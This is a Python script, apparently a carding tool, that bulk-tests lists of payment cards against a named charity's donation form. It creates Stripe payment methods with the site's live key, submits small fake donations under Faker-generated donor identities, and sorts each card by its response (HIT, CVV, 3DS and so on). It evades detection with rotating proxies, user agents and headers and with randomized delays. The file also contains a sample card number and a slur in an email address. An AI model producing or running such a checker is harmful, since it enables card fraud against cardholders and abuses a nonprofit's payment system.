#!/usr/bin/env python3
# saphausa_gateway.py - Bulk credit card checker for saphausa.org
# Uses exact captured request format + anti-rate-limit measures from original gatet.py

import os
import sys
import time
import random
import uuid
import requests
from faker import Faker
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

fake = Faker("en_US")

# ========== CONFIGURATION ==========
USE_HCAPTCHA = False          # Set True if you have a valid token; otherwise False
PROXY_FILE = "proxy.txt"      # One proxy per line: ip:port or user:pass@ip:port
CARDS_FILE = "cards.txt"      # Each line: cc|mm|yy|cvc
OUTPUT_FILE = "results.txt"   # Optional log file (set to None to disable)
DELAY_BETWEEN_CARDS = (1, 3)  # Random seconds between each card
DELAY_BETWEEN_STEPS = (0.3, 0.8)  # Between Stripe and WP requests

# ========== ROTATING HEADERS ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]
LANGUAGES = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.9,fr;q=0.8", "en-CA,en;q=0.9"]
ACCEPT_HEADERS = ["application/json, text/javascript, */*; q=0.01", "application/json, text/plain, */*", "*/*"]
REFERERS = [
    "https://saphausa.org/donation/",
    "https://saphausa.org",
    "https://www.google.com/",
]

# ========== CLASSIFICATION ==========
success_keys = [
    "appreciate", "Payment Success", "redirect_to", "thank", "Thanks", "Thank you", "Thank You",
    "redirectUrl", "succeeded", "confirmation", "Successful!", "Successful",
    "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!",
    "donation", "complete", "Payment successful"
]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "card number is incorrect", "invalid"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "declined"]
cvv_keys = ["transaction_not_allowed", "do_not_honor", "CVC"]
insufficient_keys = ["insufficient", "INSUFFICIENT_FUNDS", "Insufficient Funds"]
expired_keys = ["card has expired"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "requires_action", "3d_secure", "authenticate"]

def classify_response(last):
    if not last:
        return "DEAD"
    last_lower = str(last).lower()
    if any(k in last_lower for k in success_keys):
        return "HIT"
    if any(k in last_lower for k in otp_keys):
        return "3DS"
    if any(k in last_lower for k in ccn_keys):
        return "CCN"
    if any(k in last_lower for k in cvv_keys):
        return "CVV"
    if any(k in last_lower for k in insufficient_keys):
        return "INSUFFICIENT"
    if any(k in last_lower for k in expired_keys):
        return "EXPIRED"
    if any(k in last_lower for k in declined_keys):
        return "DECLINED"
    return "DEAD"

def format_response(status, message, amount, elapsed):
    if status == "HIT":
        return f"Thank you for your donation!|{amount}|{elapsed}"
    elif status in ["CCN", "CVV"]:
        return f"security code is incorrect|{amount}|{elapsed}"
    elif status == "3DS":
        return f"3D Secure authentication required|{amount}|{elapsed}"
    elif status == "INSUFFICIENT":
        return f"insufficient funds|{amount}|{elapsed}"
    elif status == "EXPIRED":
        return f"card has expired|{amount}|{elapsed}"
    elif status == "DECLINED":
        return f"Your card was declined.|{amount}|{elapsed}"
    else:
        clean = str(message).replace("{","").replace("}","").replace("'","")[:80]
        return f"DEAD - {clean}|{amount}|{elapsed}"

def gen_random_amount():
    cents = random.randint(50, 150)
    return f"{cents // 100}.{cents % 100:02d}"

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self, proxy_file=PROXY_FILE):
        self.proxies = []
        self.index = 0
        self.load(proxy_file)
    def load(self, fname):
        if not os.path.exists(fname):
            return
        with open(fname, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    self.proxies.append(line)
        print(f"[PROXY] Loaded {len(self.proxies)} proxies")
    def get_next(self):
        if not self.proxies:
            return None
        p = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        return {"http": f"http://{p}", "https": f"http://{p}"}

proxy_manager = ProxyManager()

# ========== SESSION FACTORY ==========
def create_session(proxy=None):
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    if proxy:
        session.proxies.update(proxy)
    return session

# ========== MAIN CHECKER ==========
def check_card(ccx: str, proxy=None):
    """
    Process one card and return result string.
    Input: "cc|mm|yy|cvc"
    Output: "message|amount|time"
    """
    start = time.time()
    try:
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return f"ERROR: Invalid format|0.00|{round(time.time()-start,1)}"
        n, mm, yy, cvc = parts
        if len(yy)==4 and yy.startswith("20"):
            yy = yy[2:]
    except:
        return f"ERROR: Parsing failed|0.00|{round(time.time()-start,1)}"

    amount = gen_random_amount()

    # Generate fresh fingerprints per card
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    guid = str(uuid.uuid4())
    client_session_id = str(uuid.uuid4())
    wallet_config_id = str(uuid.uuid4())
    # hCaptcha token – static or empty
    hcaptcha_token = ""  # leave empty if not used

    # Headers for Stripe (rotating)
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': random.choice(LANGUAGES),
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': random.choice(USER_AGENTS),
    }

    # Build Stripe data
    stripe_data = (
        f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Ssb1PQKv7Pa5TYrRye5jCnNuoF5AKML2OSyaYolYmYzuIyMCGr7ZcWxiBDI1fpYHvNDpYoxy2J7I2SpdTuwLMZa00IGG1aaXB'
    )
    if USE_HCAPTCHA:
        # You can insert a valid token here if you have one
        # stripe_data += f'&radar_options[hcaptcha_token]={hcaptcha_token}'
        pass

    session = create_session(proxy)
    time.sleep(random.uniform(*DELAY_BETWEEN_STEPS))

    # ----- Stripe request -----
    try:
        resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=30)
    except Exception:
        return f"NETWORK_ERROR|{amount}|{round(time.time()-start,1)}"

    # Retry on 429
    if resp.status_code == 429:
        time.sleep(random.uniform(2,5))
        session = create_session(proxy_manager.get_next())
        try:
            resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=30)
        except Exception:
            return f"NETWORK_ERROR|{amount}|{round(time.time()-start,1)}"

    if resp.status_code != 200:
        try:
            err = resp.json().get('error', {}).get('message', 'Unknown')
        except:
            err = resp.text[:200]
        elapsed = round(time.time()-start,1)
        err_l = str(err).lower()
        if any(k in err_l for k in ['number','invalid']):
            return f"Your card number is incorrect|{amount}|{elapsed}"
        if any(k in err_l for k in ['cvc','cvv','security']):
            return f"security code is incorrect|{amount}|{elapsed}"
        if 'expired' in err_l:
            return f"card has expired|{amount}|{elapsed}"
        if 'insufficient' in err_l:
            return f"insufficient funds|{amount}|{elapsed}"
        if 'declined' in err_l:
            return f"Your card was declined.|{amount}|{elapsed}"
        if any(k in err_l for k in ['3d','authenticate']):
            return f"3D Secure authentication required|{amount}|{elapsed}"
        return f"STRIPE_ERROR: {err[:80]}|{amount}|{elapsed}"

    try:
        pm_id = resp.json().get('id')
        if not pm_id:
            return f"STRIPE_ERROR: No PM ID|{amount}|{round(time.time()-start,1)}"
    except:
        return f"JSON_PARSE_ERROR|{amount}|{round(time.time()-start,1)}"

    # ----- WordPress submission -----
    wp_url = "https://saphausa.org/wp-admin/admin-ajax.php"
    wp_params = {'t': str(int(time.time() * 1000))}

    wp_headers = {
        'authority': 'saphausa.org',
        'accept': random.choice(ACCEPT_HEADERS),
        'accept-language': random.choice(LANGUAGES),
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://saphausa.org',
        'referer': random.choice(REFERERS),
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': random.choice(USER_AGENTS),
        'x-requested-with': 'XMLHttpRequest',
    }

    wp_cookies = {
        '__stripe_mid': '784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd',
    '__stripe_sid': '9ed60aaf-79d6-4adb-b176-fe437a1c208a80ea28',
    }

    # Generate random donor details
    first = fake.first_name()
    last = fake.last_name()
    email = f"{first.lower()}{random.randint(1000,99999)}@{random.choice(['gmail.com','outlook.com','yahoo.com'])}"
    phone = f"+1{random.randint(2000000000,9999999999)}"
    address = fake.street_name().replace(" ", "%20")

    wp_data_template = (
        '__fluent_form_embded_post_id=5442'
        '&_fluentform_1_fluentformnonce=08e4399de5'
        '&_wp_http_referer=%2Fdonation%2F'
        f'&names%5Bfirst_name%5D={first}'
        f'&names%5Blast_name%5D={last}'
        f'&email=blackniggu338%40gmail.com'
        f'&phone={phone}'
        f'&input_text={address}'
        '&input_radio=Donation'
        '&payment_input=Custom%20Amout'
        f'&custom-payment-amount={amount}'
        '&message='
        '&payment_method=stripe'
        f'&__stripe_payment_method_id={pm_id}'
    )

    wp_data = {
        'data': wp_data_template,
        'action': 'fluentform_submit',
        'form_id': '1',
    }

    time.sleep(random.uniform(*DELAY_BETWEEN_STEPS))
    try:
        r2 = session.post(wp_url, params=wp_params, cookies=wp_cookies, headers=wp_headers, data=wp_data, timeout=30)
    except Exception:
        return f"NETWORK_ERROR|{amount}|{round(time.time()-start,1)}"

    elapsed = round(time.time()-start,1)

    # ----- Parse WP response -----
    try:
        j = r2.json()
        if 'errors' in j:
            err = j['errors']
            if isinstance(err, dict) and 'restricted' in err:
                return f"Your card was declined.|{amount}|{elapsed}"
            if isinstance(err, dict):
                err_text = " ".join([v if isinstance(v,str) else " ".join(v) for v in err.values()])
            else:
                err_text = str(err)
            status = classify_response(err_text)
            return format_response(status, err_text, amount, elapsed)
        if j.get('success') == True:
            return f"Thank you for your donation!|{amount}|{elapsed}"
        msg = j.get('message', str(j))
        status = classify_response(msg)
        return format_response(status, msg, amount, elapsed)
    except:
        text = r2.text[:200]
        if "thank" in text.lower():
            return f"Thank you for your donation!|{amount}|{elapsed}"
        status = classify_response(text)
        return format_response(status, text, amount, elapsed)

# ========== COMPATIBILITY WRAPPER for main.py ==========
def Tele(ccx: str, proxies: dict = None):
    """
    Wrapper that calls check_card with the same signature expected by main.py.
    """
    return check_card(ccx, proxies)

# ========== BULK PROCESSOR ==========
def bulk_process(card_file=CARDS_FILE, output_file=OUTPUT_FILE):
    if not os.path.exists(card_file):
        print(f"[ERROR] Cards file '{card_file}' not found.")
        return
    with open(card_file, "r") as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    total = len(lines)
    print(f"[BULK] Processing {total} cards")
    out_fh = open(output_file, "w") if output_file else None
    if out_fh:
        out_fh.write("card|result|amount|time\n")

    for idx, card in enumerate(lines, 1):
        print(f"[{idx}/{total}] Checking {card} ...")
        proxy = proxy_manager.get_next()
        result = check_card(card, proxy)
        print(f"  -> {result}")
        if out_fh:
            out_fh.write(f"{card}|{result}\n")
            out_fh.flush()
        if idx < total:
            delay = random.uniform(*DELAY_BETWEEN_CARDS)
            time.sleep(delay)

    if out_fh:
        out_fh.close()
        print(f"[BULK] Results saved to {output_file}")

if __name__ == "__main__":
    # Single card test (uncomment to use)
    #test_card = "4403932672301271|07|28|539"
    #print(check_card(test_card))
    sys.exit(0)

    # Bulk processing (only runs if not exited above)
    bulk_process()